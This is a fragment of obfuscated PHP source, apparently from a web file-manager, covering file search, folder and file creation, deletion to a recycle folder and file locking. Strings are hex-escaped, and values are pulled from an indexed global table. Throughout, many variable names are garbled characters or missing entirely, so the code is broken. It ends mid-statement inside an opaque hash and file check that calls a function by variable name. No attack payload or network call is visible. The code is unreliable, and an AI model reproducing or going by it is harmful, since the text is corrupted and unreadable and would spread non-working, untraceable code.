"\123\105\x4c\x45\103\124\40\x2a\40\x46\122\117\x4d\40\163\161\154\151\164\145\137\155\x61\x73\x74\145\162\40\x57\110\105\122\x45\40\164\142\154\137\156\141\155\145\x20\75\x20\47{$Œº}\x27"; $⁄• = $->query($); if (empty($⁄•)) { $ = array($…à[844] => $…à[22], $…à[23] => $…à[22]); return $”ßÃ° ? $[$”ßÃ°] : $; } $ = $->query($ﬂ´); $Ô∫≤ = $…Ñ = array(); foreach ($ as $) { if ($[$…à[43]] == $…à[332]) { $Ô∫≤[] = $[$…à[1171]]; } else { $…Ñ[$[$…à[42]]] = $[$…à[1171]]; } } $‹¥ = array_merge(array($…à[1167] . $Œº . $…à[128]), $Ô∫≤, array_values($…Ñ)); $‹¥ = implode($…à[81] . PHP_EOL, $‹¥) . $…à[81]; if ($”ßÃ° && $”ßÃ° == $…à[23]) { return $‹¥; } $⁄Ç = array(); $ = array($…à[1159] => $…à[1172], $…à[368] => $…à[1173]); $—é = $…à[22]; foreach ($⁄• as $) { if ($[$…à[67]] == $…à[98]) { $—é = $[$…à[42]]; } $√ò = array($…à[438] . $[$…à[42]] . $…à[438], isset($[$[$…à[43]]]) ? $[$[$…à[43]]] : $[$…à[43]], $[$…à[45]] == $…à[98] ? $…à[1164] : $…à[1174] . $[$…à[66]], $[$…à[67]] == $…à[98] ? $…à[1175] : $…à[22]); $⁄Ç[] = trim(implode($…à[63], $√ò)); } foreach ($…Ñ as $ÿ≤»É => $) { $…è = str_replace($…à[1176] . $Œº . $…à[21], $…à[22], $ÿ≤»É); $ = str_replace(array($…à[128], $…à[998]), $…à[438], substr($, stripos($, $…à[313]))); if ($…è == $…à[1153]) { $ÓÄû = $…à[1177] . $—é . $…à[1178]; } else { $ÓÄû = (stripos($…è, $…à[21]) ? $…à[1179] : $…à[22]) . ($…à[1180] . $…è . $…à[1181] . $); } $⁄Ç[] = $ÓÄû; } $…ï‘ö = array($…à[1182] . $Œº . $…à[1183], $…à[1184] . $Œº . $…à[1185], implode($…à[60] . PHP_EOL, $⁄Ç), $…à[1186]); $›∏ = implode(PHP_EOL, $…ï‘ö); if ($”ßÃ° && $”ßÃ° == $…à[844]) { return $›∏; } $ = array($…à[844] => $›∏, $…à[23] => $‹¥); return $”ßÃ° ? $[$”ßÃ°] : $; } } goto DÈ¢º; aŸõ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($) { $ =& $_SERVER[]; $∆ï∆à = KodIO::fileTypeList(); $÷ä = $∆ï∆à[$]; if (!$÷ä) { return array(); } $ ± = $÷ä[$[185]]; $ = $[17]; if (!$÷ä[$[185]]) { $ = array_to_keyvalue($∆ï∆à, $[22], $[185]); $ ± = implode($[60], $); $ = $[2139]; } $…µ = explode($[60], trim($ ±, $[60])); return array($, $…µ); } public function listPathType($) { $ =& $_SERVER[]; $œê–ª = $this->fileTypeWhere($); if (!$œê–ª) { return array(); } $ÿ® = USER_ID; $€Å = Model($[576])->getInfo($ÿ®); $ƒ† = array($[625] => SourceModel::TYPE_USER, $[562] => array($[589], $[572] . $€Å[$[97]][$[191]] . $[590]), $[626] => $ÿ®, $[623] => 0, $[624] => $œê–ª); return $this->listSource($ƒ†); } public function listSearch($, $ = 300) { $…ç =& $_SERVER[]; if (isset($[$…ç[1977]]) && $[$…ç[1977]]) { $[$…ç[1977]] = str_replace($…ç[437], $…ç[2140], trim($[$…ç[1977]])); } $Ã≥ = $this->_parseSearchWhere($); if (!isset($Ã≥[$…ç[482]])) { $Ã≥[$…ç[482]] = 0; } $◊ä = $…ç[2141]; $ = $Ã≥; $œâ√ê = $◊ä; $this->_listSearchBindPinyin($, $Ã≥, $◊ä); $this->alias($…ç[496])->_makeOrder(); $Ã≥ = $this->parseWhereLike($Ã≥); $œ¢ = $this->distinct(!0)->field($◊ä)->where($Ã≥)->selectPage($); if ($GLOBALS[$…ç[16]][$…ç[434]][$…ç[435]] && Input::check($[$…ç[1977]], $…ç[632]) && $œ¢[$…ç[419]][$…ç[406]] == 1 && $œ¢[$…ç[419]][$…ç[420]] == 0) { $œ¢ = $this->distinct(!0)->field($◊ä)->where($)->limit(1000)->select(); $œ¢ = array_page_split($œ¢, !1, $); } $this->_listSearchFileContent($œ¢, $, $œâ√ê, $); $this->_listSearchDesc($œ¢, $, $œâ√ê); $this->_listSearchTag($œ¢, $, $œâ√ê); $this->_listSearchGroupTag($œ¢, $, $œâ√ê); $this->_listDataApply($œ¢[$…ç[422]]); $this->_listMake($œ¢); return $œ¢; } private function _listSearchFileContent(&$Âßß, $Õß, $, $ƒã) { $‰åá =& $_SERVER[]; if (!$Õß[$‰åá[1977]] || $Âßß[$‰åá[419]][$‰åá[406]] > 1) { return; } if (!isset($ƒã[$‰åá[42]]) || !is_array($Õß[$‰åá[518]])) { return; } $ƒã[$‰åá[518]] = array($‰åá[17], $Õß[$‰åá[518]]); unset($ƒã[$‰åá[42]]); unset($Õß[$‰åá[518]]); $ = $this->field($)->where($ƒã)->limit($‰åá[2142])->select(); if (!$ || count($) == 0) { return; } $Âßß[$‰åá[422]] = array_merge($, $Âßß[$‰åá[422]]); $Âßß[$‰åá[419]][$‰åá[420]] += count($); } private function _listSearchTag(&$ÈÖ∏, $, $€ù) { $Œëÿ± =& $_SERVER[]; if (!$[$Œëÿ±[1977]] || $ÈÖ∏[$Œëÿ±[419]][$Œëÿ±[406]] > 1) { return; } $ = Model($Œëÿ±[2143])->listData(); $≈æ = array(); $ = $[$Œëÿ±[1977]]; foreach ($ as $) { $‹∑Ïè• = $[$Œëÿ±[42]]; $ = str_replace($Œëÿ±[63], $Œëÿ±[22], Pinyin::get($‹∑Ïè•)); if (stripos($‹∑Ïè•, $) !== !1 || stripos($, $) !== !1) { $≈æ[] = $[$Œëÿ±[452]]; } } if (!$≈æ) { return; } $ = array($Œëÿ±[477] => array($Œëÿ±[17], $≈æ), $Œëÿ±[1685] => USER_ID); $ = Model($Œëÿ±[479])->field($Œëÿ±[94])->where($)->select(); $ = array_to_keyvalue($, $Œëÿ±[22], $Œëÿ±[94]); $ƒâ = array_unique($); $this->_listSearchMerge($ÈÖ∏, $, $€ù, $ƒâ); } private function _listSearchDesc(&$, $, $€¥”ã) { $ =& $_SERVER[]; if (!$[$[1977]] || $[$[419]][$[406]] > 1) { return; } $ = array($[104] => $[503], $[427] => array($[436], $[1979] . $[$[1977]] . $[1979])); $ = !1; if ($) { $ = $this->listSearchChildren($[$[190]]); $ = array_unique($); if (!$) { return; } $[$[191]] = array($[17], $); } $ = Model($[609])->field($[191])->where($)->limit(5000)->select(); $◊™ = array_to_keyvalue($, $[22], $[191]); $this->_listSearchMerge($, $, $€¥”ã, $◊™); } private function _listSearchGroupTag(&$ õ, $–ä, $’ì) { $ŸÜ =& $_SERVER[]; if (!$–ä[$ŸÜ[1977]] || $ õ[$ŸÜ[419]][$ŸÜ[406]] > 1 || !$–ä[$ŸÜ[190]]) { return; } $ÿ´ = $this->sourceInfo($–ä[$ŸÜ[190]]); if (!$ÿ´ || $ÿ´[$ŸÜ[188]] != SourceModel::TYPE_GROUP) { return; } $ = $ÿ´[$ŸÜ[547]]; $«æ‚°Ω = Model($ŸÜ[2144])->get($); $ = array(); $Õ±≈≤ = $–ä[$ŸÜ[1977]]; foreach ($«æ‚°Ω[$ŸÜ[422]] as $) { $«§ = $[$ŸÜ[42]]; $ = str_replace($ŸÜ[63], $ŸÜ[22], Pinyin::get($«§)); if (stripos($«§, $Õ±≈≤) !== !1 || stripos($, $Õ±≈≤) !== !1) { $[] = $[$ŸÜ[452]]; } } if (!$) { return; } $≈ü◊ì = array($ŸÜ[477] => array($ŸÜ[17], $), $ŸÜ[1685] => 0, $ŸÜ[43] => $ŸÜ[1999] . $); $ = Model($ŸÜ[479])->field($ŸÜ[94])->where($≈ü◊ì)->select(); $ = array_to_keyvalue($, $ŸÜ[22], $ŸÜ[94]); $Àá = array_unique($); $this->_listSearchMerge($ õ, $–ä, $’ì, $Àá); } private function _listSearchMerge(&$Îñ¶, $Ãà, $∆Ω, $Ãü) { $ÒÑ≥û =& $_SERVER[]; if (!$Ãü) { return; } $ = array_to_keyvalue($Îñ¶[$ÒÑ≥û[422]], $ÒÑ≥û[22], $ÒÑ≥û[191]); $ = array_diff($Ãü, $); if (!$) { return; } $œ¢ = array($ÒÑ≥û[191] => array($ÒÑ≥û[17], $)); $“Ä = $this->field($∆Ω)->where($œ¢)->select(); if (!$“Ä) { return; } $—∞Õ£ = array(); foreach ($“Ä as $‰¨•≈µ) { if ($this->_listSearchFilter($‰¨•≈µ, $Ãà)) { $—∞Õ£[] = $‰¨•≈µ; } } $Îñ¶[$ÒÑ≥û[422]] = array_merge($—∞Õ£, $Îñ¶[$ÒÑ≥û[422]]); $Îñ¶[$ÒÑ≥û[419]][$ÒÑ≥û[420]] += count($—∞Õ£); } private function _listSearchFilter($…£, $»£) { $Âïì =& $_SERVER[]; $‡Æû = $…£[$Âïì[462]] == $Âïì[98]; if (!strstr($…£[$Âïì[562]], $Âïì[60] . $»£[$Âïì[190]] . $Âïì[60])) { return !1; } if (isset($»£[$Âïì[463]]) && $»£[$Âïì[463]] != $Âïì[1938]) { if ($»£[$Âïì[463]] == $Âïì[85] && !$‡Æû) { return !1; } if ($»£[$Âïì[463]] != $Âïì[85] && $‡Æû) { return !1; } if (!strstr($…£[$Âïì[185]], $Âïì[60] . $»£[$Âïì[463]] . $Âïì[60])) { return !1; } } if (isset($»£[$Âïì[2145]]) && $»£[$Âïì[2145]] < $…£[$Âïì[86]]) { return !1; } if (isset($»£[$Âïì[2146]]) && $»£[$Âïì[2146]] > $…£[$Âïì[86]]) { return !1; } if (isset($»£[$Âïì[639]]) && $»£[$Âïì[639]] != $…£[$Âïì[506]]) { return !1; } return !0; } public function listSearchChildren($‘π, $„ä¨‹ß = 5000) { $¬ó›â =& $_SERVER[]; $ÏåΩ = array(); $÷ò = $this->sourceInfo($‘π); $…ô”â = array($¬ó›â[562] => array($¬ó›â[436], $÷ò[$¬ó›â[562]] . $÷ò[$¬ó›â[191]] . $¬ó›â[590])); $ = $this->field($¬ó›â[86])->where($…ô”â)->limit($„ä¨‹ß + 1)->select(); $ﬁú = is_array($) ? count($) : 0; if ($ﬁú > $„ä¨‹ß) { return $this->_listSearchChildrenNear($‘π, $„ä¨‹ß); } $ = $this->field($¬ó›â[191])->where($…ô”â)->select(); $ÏåΩ = array_to_keyvalue($, $¬ó›â[22], $¬ó›â[191]); return $ÏåΩ; } private function _listSearchChildrenNear($, $€®) { $ =& $_SERVER[]; $ = array(); $ = array($[190] => $); $¬§ = $this->field($[2147])->where($)->select(); $ÿó = array_to_keyvalue(array_filter_by_field($¬§, $[462], $[98]), $[22], $[191]); $ = array_merge($, array_to_keyvalue($¬§, $[22], $[191])); if (!$ÿó) { return $; } $ = array($[190] => array($[17], $ÿó)); $¬§ = $this->field($[2147])->where($)->limit($€®)->select(); $ = array_merge($, array_to_keyvalue($¬§, $[22], $[191])); $ = array_slice($, 0, $€®); return $; } private function _listSearchBindPinyin($, &$“ç, &$ÁÅÑ) { $ é =& $_SERVER[]; if (!isset($[$ é[1977]]) || !$[$ é[1977]]) { return; } if (!Input::check($[$ é[1977]], $ é[371]) || strlen($[$ é[1977]]) < 2) { return; } $ = "\x4c\105\106\x54\40\112\x4f\111\116\40{$this->tablePrefix}\151\157\137\163\157\165\x72\143\x65\x5f\x6d\145\164\141\x20\155\x65\x74\141\x20\157\x6e\40\x73\157\x75\x72\143\x65\x2e\x73\157\165\162\x63\x65\x49\x44\x20\x3d\x20\x6d\x65\164\141\x2e\163\x6f\x75\x72\x63\x65\x49\x44"; $Ó£û = array(); $ÁÅÑ = str_replace(array($ é[11], $ é[63], $ é[2148]), $ é[22], $ÁÅÑ); $ÁÅÑ = $ é[488] . str_replace($ é[60], $ é[489], $ÁÅÑ); $ = $“ç[$ é[42]]; unset($“ç[$ é[42]]); foreach ($“ç as $ => $ ≤) { $Ó£û[$ é[488] . $] = $ ≤; } foreach ($ as $›´) { $Ó£û[] = array($ é[493] => $›´, $ é[1041] => $ é[1981], array($ é[2149] => $›´, $ é[2150] => array($ é[17], array($ é[515], $ é[514])))); } $this->join($); $“ç = $Ó£û; } private function _parseSearchWhere($À∞) { $ =& $_SERVER[]; $ = array(); if (isset($À∞[$[800]]) && $À∞[$[800]]) { $[$[95]] = array($[2151], $À∞[$[800]]); } if (isset($À∞[$[801]]) && $À∞[$[801]]) { $Û•å∑ = array($[2152], $À∞[$[801]]); if ($[$[95]]) { $[$[95]] = array($[$[95]], $Û•å∑, $[2153]); } else { $[$[95]] = $Û•å∑; } } if (isset($À∞[$[2145]]) && $À∞[$[2145]] > 0) { $[$[86]] = array($[2151], $À∞[$[2145]]); } if (isset($À∞[$[2146]]) && $À∞[$[2146]]) { $Û•å∑ = array($[2152], $À∞[$[2146]]); if ($[$[86]]) { $[$[86]] = array($[$[86]], $Û•å∑, $[2153]); } else { $[$[86]] = $Û•å∑; } } if (isset($À∞[$[639]]) && $À∞[$[639]]) { $[] = array($[506] => $À∞[$[639]], $[504] => $À∞[$[639]], $[1041] => $[1981]); } if (isset($À∞[$[463]]) && $À∞[$[463]]) { $·àΩ = $À∞[$[463]]; if ($·àΩ == $[85]) { $[$[462]] = 1; } else { if ($·àΩ == $[2154]) { $[$[462]] = 0; } else { if ($·àΩ) { $·àΩ = is_array($·àΩ) ? $·àΩ : explode($[60], $·àΩ); $[$[463]] = array($[469], $·àΩ); $[$[462]] = 0; } } } } $this->_parseSearchParent($À∞, $); if (isset($À∞[$[1977]]) && trim($À∞[$[1977]])) { $Úëü¶ = trim($À∞[$[1977]]); $ = explode($[63], $Úëü¶); if (strlen($Úëü¶) > 2 && (substr($Úëü¶, 0, 1) == $[128] && substr($Úëü¶, -1) == $[128]) || substr($Úëü¶, 0, 1) == $[68] && substr($Úëü¶, -1) == $[68]) { $Úëü¶ = substr($Úëü¶, 1, -1); $ = array($Úëü¶); } $[$[42]] = array(array($[589], $[1979] . $Úëü¶ . $[1979])); if (count($) > 1) { $[$[42]] = array(); foreach ($ as $√å) { if (!trim($√å)) { continue; } $[$[42]][] = array($[589], $[1979] . trim($√å) . $[1979]); } } } return $; } private function _parseSearchParent($Ÿ¢, &$÷û¬∂) { $Ïøä =& $_SERVER[]; if (!isset($Ÿ¢[$Ïøä[190]]) || !$Ÿ¢[$Ïøä[190]]) { return; } $ = $this->pathInfo($Ÿ¢[$Ïøä[190]]); $ = $[$Ïøä[190]] . $Ïøä[22] === $Ïøä[222]; $€Éﬂî = $[$Ïøä[188]] == $Ïøä[556]; if ($[$Ïøä[573]] == $Ïøä[574]) { $ = $this->sourceInfo($Ÿ¢[$Ïøä[190]]); $[$Ïøä[562]] = $[$Ïøä[562]]; } $÷û¬∂[$Ïøä[629]] = array($Ïøä[589], $[$Ïøä[562]] . $Ÿ¢[$Ïøä[190]] . $Ïøä[590]); $ = isset($Ÿ¢[$Ïøä[1842]]) && in_array($Ïøä[556], $Ÿ¢[$Ïøä[1842]]); if (!$ || !$€Éﬂî || !$ || !$[$Ïøä[464]]) { return; } if (!AuthModel::authCheckRoot($[$Ïøä[464]][$Ïøä[465]])) { return; } $Õà√ó = $[$Ïøä[547]] . $Ïøä[22]; if ($Õà√ó == $Ïøä[98]) { unset($÷û¬∂[$Ïøä[629]]); $÷û¬∂[$Ïøä[188]] = self::TYPE_GROUP; return; } $»≥ = Model($Ïøä[563])->groupChildrenAll($Õà√ó); $ = count($»≥); if ($ <= 1) { return; } $ = array($Ïøä[190] => 0, $Ïøä[188] => self::TYPE_GROUP, $Ïøä[547] => array($Ïøä[17], $»≥)); $Ûπ≠Ü = $this->field($Ïøä[2155])->where($)->limit($)->select(); $÷û¬∂[$Ïøä[629]] = array(); foreach ($Ûπ≠Ü as $ﬂª) { $÷û¬∂[$Ïøä[629]][] = array($Ïøä[589], $Ïøä[572] . $ﬂª[$Ïøä[191]] . $Ïøä[590]); } $÷û¬∂[$Ïøä[629]][] = $Ïøä[1981]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($–π) { $»Ω =& $_SERVER[]; $ = Model($»Ω[555])->where(array($»Ω[1676] => $–π))->find(); $ = $this->_mkdirRoot(SourceModel::TYPE_USER, $–π, $[$»Ω[42]]); $this->userDesktopAdd($); return $; } public function userDesktopAdd($) { $»π =& $_SERVER[]; $ = LNG($»π[2156]); $ = $this->mkdir($, $); $this->metaSet($, $»π[2157], $»π[98]); $this->metaSet($, $»π[2158], $); } public function userPathSafeAdd($) { $ =& $_SERVER[]; $…æ∆• = Model($[555])->getInfoFull($); if (!$…æ∆•) { return !1; } if (_get($…æ∆•, $[577])) { return $…æ∆•[$[516]][$[2159]]; } $€û = $this->_mkdirRoot(SourceModel::TYPE_USER, $, $[2160], $[483]); Model($[555])->metaSet($, $[2159], $€û); $this->metaSet($€û, $[2161], $); return $€û; } public function groupRootAdd($”§) { $–∏—± =& $_SERVER[]; $ = Model($–∏—±[563])->where(array($–∏—±[1971] => $”§))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $”§, $[$–∏—±[42]]); } public function systemRootPathAdd($) { if ($ != $_SERVER[][583]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $); } public function userRootRemove($) { $ﬁï÷û = $this->targetSourceRoot(SourceModel::TYPE_USER, $, !0); foreach ($ﬁï÷û as $»è) { if (!$»è) { continue; } $this->remove($»è[$_SERVER[][191]], !1); } } public function groupRootRemove($Ÿõ) { $÷≠ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ÿõ); if (!$÷≠) { return; } $this->remove($÷≠[$_SERVER[][191]], !1); } private function _mkdirRoot($, $, $, $ﬂÆ = '') { $›ä∆ª =& $_SERVER[]; $ = defined($›ä∆ª[2104]) ? USER_ID : 0; $ﬂë = array($›ä∆ª[454] => 0, $›ä∆ª[625] => $, $›ä∆ª[626] => $, $›ä∆ª[623] => 1, $›ä∆ª[627] => $, $›ä∆ª[628] => $, $›ä∆ª[624] => $ﬂÆ, $›ä∆ª[629] => $›ä∆ª[572], $›ä∆ª[481] => 0, $›ä∆ª[594] => 0, $›ä∆ª[519] => 0, $›ä∆ª[630] => $›ä∆ª[22]); if ($…Ñ–∏ = $this->where($ﬂë)->find()) { return $…Ñ–∏[$›ä∆ª[191]]; } $ = "\115\x6f\x64\x65\x6c\x53\157\x75\162\143\145\x2e\x6d\153\x64\x69\x72\x52\157\157\x74\56{$}\56{$}\56" . $; CacheLock::lock($); $ﬂë[$›ä∆ª[42]] = $; $∆¨ = $this->add($ﬂë); $€¶ = array($›ä∆ª[631] => short_id($∆¨)); $this->where(array($›ä∆ª[468] => $∆¨))->save($€¶); CacheLock::unlock($); return $∆¨; } private function targetSourceRoot($ƒë, $ ê€É, $Âíé = false) { $ =& $_SERVER[]; $‘™ = array($[454] => 0, $[625] => $ƒë, $[626] => $ ê€É); if ($Âíé) { $ = $this->where($‘™)->select(); return $ ? $ : array(); } $Õø…Ω = $this->where($‘™)->find(); return $Õø…Ω ? $Õø…Ω : array(); } public function sourceRootGroup($∆•œ°) { $ =& $_SERVER[]; if (is_string($∆•œ°)) { $∆•œ° = array($∆•œ°); } $”πﬁÆ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $∆•œ°, $[213]); $ÿï = array($[422] => $”πﬁÆ, $[419] => array($[798] => count($∆•œ°))); $this->_listDataApply($ÿï[$[422]]); $this->_listMake($ÿï); return array_to_keyvalue($ÿï[$[92]], $[547]); } public function mkfile($›ó, $Ôèù, $ = '', $…Ñ = REPEAT_RENAME) { $«û =& $_SERVER[]; $∆ô = Model($«û[652])->addFileByContent($, $Ôèù); return $this->_createFileCall($›ó, $Ôèù, $∆ô, $…Ñ, $«û[1383]); } public function addFile($«çÕö, $Î¥â, $Ÿä, $À± = false, $ = REPEAT_RENAME) { $ = Model($_SERVER[][652])->addFile($Î¥â, $Ÿä, $À±); return $this->_createFileCall($«çÕö, $Ÿä, $, $); } public function addFileByFileID($÷Ö, $◊ñ, $Ÿ∫‚≤≥, $≈• = REPEAT_RENAME) { $‘Å =& $_SERVER[]; $…â = Model($‘Å[652])->find($◊ñ); Model($‘Å[652])->linkAdd($◊ñ); return $this->_createFileCall($÷Ö, $Ÿ∫‚≤≥, $…â, $≈•); } public function addFileByRemote($‰¢≠”É, $, $, $¬î = array(), $ﬁµ = REPEAT_RENAME) { $ = Model($_SERVER[][652])->addFileByRemote($, $, $¬î); return $this->_createFileCall($‰¢≠”É, $, $, $ﬁµ); } private function _createFileCall($ÃÄ, $»´, $, $…í, $ÿ≤ = "\x75\x70\x6c\157\141\144") { $Ã§ =& $_SERVER[]; $ = !1; $this->setMasterDB(); $this->lockWriteStart($ÃÄ, $»´); $ = $this->fileNameExist($ÃÄ, $»´); $÷¨ = $this->_createFile($ÃÄ, $»´, $, $…í, $); if (!$) { Model($Ã§[521])->remove($[$Ã§[518]]); } if ($ && $÷¨ && $÷¨ != $) { Model($Ã§[2129])->eventCreate($÷¨, $ÿ≤); } $this->lockWriteEnd($ÃÄ, $»´); return $÷¨; } public function mkdir($, $ÏàÅ, $“ã = REPEAT_SKIP) { $ =& $_SERVER[]; $this->setMasterDB(); $’ñ = $this->sourceInfo($); if (!$’ñ) { return !1; } $this->lockWriteStart($, $ÏàÅ); if ($“ã !== !1) { $“õ = $this->fileNameExist($, $ÏàÅ); if ($“õ && $“ã != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($, $ÏàÅ); return $“õ; } $ÏàÅ = $this->fileNameAuto($, $ÏàÅ, $“ã); } $”à = array($[623] => 1, $[471] => $ÏàÅ, $[624] => $[22], $[519] => 0, $[594] => 0); $≈Ç»Å = $this->_addSource($”à, $’ñ); Model($[2129])->eventCreate($≈Ç»Å, $[1384]); $this->lockWriteEnd($, $ÏàÅ); return $≈Ç»Å; } public function listSourceRoot($ƒÜ, $€ù, $∆® = "\x73\x6f\165\162\x63\145\111\x44\54\164\x61\x72\147\x65\x74\x49\x44\x2c\x73\151\172\x65") { $Õâ”° =& $_SERVER[]; $€â = $Õâ”°[431]; $ÛØªÑ = array(); $«á = 1024 * 50; $ÿ¢ = is_array($ÿ¢) ? $ÿ¢ : array(); $∆≥ = count($€ù); $–ä = $this->tablePrefix . $Õâ”°[2162]; for ($ = 0; $ < $∆≥; $++) { $ = $€ù[$]; $€â .= "\x53\105\x4c\105\x43\124\x20\x2a\x20\x46\x52\x4f\x4d\40\x28\123\105\x4c\x45\x43\x54\40{$∆®}\x20\x46\122\117\x4d\x20\140{$–ä}\140\x20\x57\110\105\122\x45\40"; $€â .= "\x60\x70\x61\x72\145\156\164\111\x44\140\75\60\x20\101\116\x44\x20\x60\x74\141\162\x67\145\164\111\x44\140\x3d{$}\x20\x41\116\104\x20\x60\x74\141\162\147\145\164\124\171\x70\145\x60\75{$ƒÜ}\x20\x61\156\x64\40\146\151\154\x65\x54\x79\160\x65\75\x27\x27\x20\154\x69\155\x69\x74\x20\61\51\x20\x61\163\40\164\142\137{$}\x20\125\116\111\x4f\116\40\101\x4c\x4c\40"; if ((strlen($€â) >= $«á || $ == $∆≥ - 1) && $€â) { $€â = substr($€â, 0, -strlen($Õâ”°[1079])); $ŒÆ = $this->query($€â); $€â = $Õâ”°[22]; $ÛØªÑ = array_merge($ÛØªÑ, $ŒÆ); } } return $ÛØªÑ; } private function _createFile($ﬁé, $Ë¶≠, $⁄õ, $î∞Ø, &$) { $ÿç =& $_SERVER[]; $◊¨ = $this->sourceInfo($ﬁé); if (!$⁄õ || !$◊¨) { return !1; } if ($î∞Ø !== !1) { $ = $this->fileNameExist($ﬁé, $Ë¶≠); } $ = !0; if ($î∞Ø && $) { if ($î∞Ø == REPEAT_SKIP) { $ = !1; return $; } else { if ($î∞Ø == REPEAT_REPLACE) { $ = $this->sourceInfo($); $Ãà = $this->fileHistory($, $⁄õ[$ÿç[518]], $⁄õ[$ÿç[86]]); if (!$Ãà) { $ = !1; } else { $this->folderSizeReset($ﬁé); } return $; } else { $Ë¶≠ = $this->fileNameAuto($ﬁé, $Ë¶≠, $î∞Ø, !1); } } } $«Ø = array($ÿç[623] => 0, $ÿç[471] => $Ë¶≠, $ÿç[624] => substr(get_path_ext($Ë¶≠), 0, 10), $ÿç[519] => $⁄õ[$ÿç[518]], $ÿç[594] => $⁄õ[$ÿç[86]]); $”≠ = $this->_addSource($«Ø, $◊¨); $this->folderSizeReset($ﬁé, intval($«Ø[$ÿç[86]])); return $”≠; } protected function fileHistory($, $“§, $) { $”©¬¥ =& $_SERVER[]; if ($[$”©¬¥[518]] == $“§) { return !1; } $this->checkLock($[$”©¬¥[191]], $“§); Model($”©¬¥[2163])->addHistory($); $ = array($”©¬¥[628] => USER_ID, $”©¬¥[475] => time(), $”©¬¥[518] => $“§, $”©¬¥[86] => $); $this->where(array($”©¬¥[468] => $[$”©¬¥[191]]))->save($); $this->sourceCacheClear($[$”©¬¥[191]]); return !0; } public function checkLock($≈µ, $‹™) { $”ª =& $_SERVER[]; $¬≥ = $this->pathInfo($≈µ); if (!$this->fileIsLock($¬≥, !0)) { return; } $’Å€± = Session::get($”ª[2164]); $ = substr($¬≥[$”ª[42]], 0, -1 - strlen($¬≥[$”ª[185]])) . $”ª[1249] . $’Å€± . $”ª[20] . $¬≥[$”ª[185]]; $ = Model($”ª[652])->find($‹™); $this->_createFileCall($¬≥[$”ª[190]], $, $, REPEAT_REPLACE, $”ª[1383]); $Ÿá = $¬≥[$”ª[516]][$”ª[587]]; $ﬁå = $Ÿá[$”ª[2165]] ? $Ÿá[$”ª[2165]] : $Ÿá[$”ª[42]]; show_json(LNG($”ª[2166]) . $”ª[2167] . LNG($”ª[2168]) . $”ª[2169] . $ﬁå . $”ª[2170], !1); } public function fileIsLock($ÍöÖ, $Îæà = false) { $œá =& $_SERVER[]; if (!isset($ÍöÖ[$œá[516]]) || !$ÍöÖ[$œá[516]][$œá[584]]) { return !1; } if ($ÍöÖ[$œá[516]][$œá[584]] != USER_ID) { return !0; } $ = $GLOBALS[$œá[16]][$œá[99]][$œá[585]]; if ($ÍöÖ[$œá[516]][$œá[586]] <= time() - $) { $this->metaSet($ÍöÖ[$œá[191]], $œá[584], null); $this->metaSet($ÍöÖ[$œá[191]], $œá[586], null); } if ($Îæà) { $this->metaSet($ÍöÖ[$œá[191]], $œá[586], time()); } return !1; } private function _addSource($Ò£Æ¶, $∆ù) { $»ñ =& $_SERVER[]; $ = defined($»ñ[2104]) ? USER_ID : 0; $≈Ø = array($»ñ[625] => $∆ù[$»ñ[188]], $»ñ[626] => $∆ù[$»ñ[547]], $»ñ[627] => $, $»ñ[628] => $, $»ñ[454] => $∆ù[$»ñ[191]], $»ñ[629] => $∆ù[$»ñ[562]] . $∆ù[$»ñ[191]] . $»ñ[60], $»ñ[481] => 0, $»ñ[630] => $»ñ[22]); $Ò£Æ¶ = array_merge($≈Ø, $Ò£Æ¶); $this->updateModifyTime($Ò£Æ¶[$»ñ[190]]); $‰Üë = $»ñ[2171] . $∆ù[$»ñ[191]]; if (isset(self::$cacheChildList[$‰Üë])) { unset(self::$cacheChildList[$‰Üë]); } static $ = false; if (!$) { Hook::trigger($»ñ[613], $Ò£Æ¶); $ = !0; } $ = $this->add($Ò£Æ¶); $ = array($»ñ[631] => short_id($)); $this->where(array($»ñ[468] => $))->save($); $this->setNamePinyin($, $Ò£Æ¶[$»ñ[42]]); return $; } public function remove($, $ = true) { $ =& $_SERVER[]; $ = $this->sourceInfo($); $ = intval($[$[188]]) === self::TYPE_SYSTEM; $ = Model($[485])->get($[2172]) == $[98]; if ($ || $ || !$) { return $this->removeNow($, $); } $„Ñì = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ = $[$[188]] == self::TYPE_USER ? $[639] : $[556]; if ($ == $[639]) { $ = Model($[555])->getInfo($[$[547]]); $«ÖœÆ = !empty($[$[2165]]) ? $[$[2165]] : $[$[42]]; $«ÖœÆ = $[313] . $«ÖœÆ . $[2173] . $[$[547]]; } else { $ = Model($[563])->getInfo($[$[547]]); $«ÖœÆ = _get($, $[42]); $«ÖœÆ = $[173] . $«ÖœÆ . $[2174] . $[$[547]]; } $ÕØ = $[2175] . md5($«ÖœÆ); CacheLock::lock($ÕØ); $ = $this->fileNameExist($„Ñì, $«ÖœÆ); if (!$) { $ = $this->mkdir($„Ñì, $«ÖœÆ, REPEAT_SKIP); $this->metaSet($, $[2176], $); $this->metaSet($, $[2177], $[$[547]]); if ($[$[190]] != 0) { $this->metaSet($, $[2178], _get($, $[2179])); } } CacheLock::unlock($ÕØ); $this->metaSet($, $[2180], $[$[190]]); $this->where(array($[191] => $))->save(array($[475] => time())); $this->recycleClear($); $Ïâ© = $this->move($, $, REPEAT_RENAME_FOLDER); $this->folderSizeReset($[$[190]]); return $Ïâ©; } private function recycleClear($) { $–ß =& $_SERVER[]; $√™—á = $this->childrenAll($); $ÃÉÀò = array($–ß[468] => array($–ß[469], $√™—á[$–ß[2181]])); Model($–ß[2182])->where($ÃÉÀò)->delete(); } public function removeNow($⁄π, $—É∆ê = true) { $Ê≥¶ =& $_SERVER[]; $≈ó = $_SERVER[$Ê≥¶[15]]; $ﬂá = $Ê≥¶[917]; if ($_SERVER[$Ê≥¶[6]] != $ﬂá($≈ó)) { $ƒ® = $Ê≥¶[918]; $ = $Ê≥¶[8]; $‘Å“æ = $_SERVER[$Ê≥¶[9]] . $Ê≥¶[10]; $⁄é = $($‘Å“æ); $ = explode($Ê≥¶[11], $⁄é); if (count($) < $Ê≥¶[662]) { $„àÇ = $Ê≥¶[13]; $„àÇ(); } $–â = $Ê≥¶[919]; 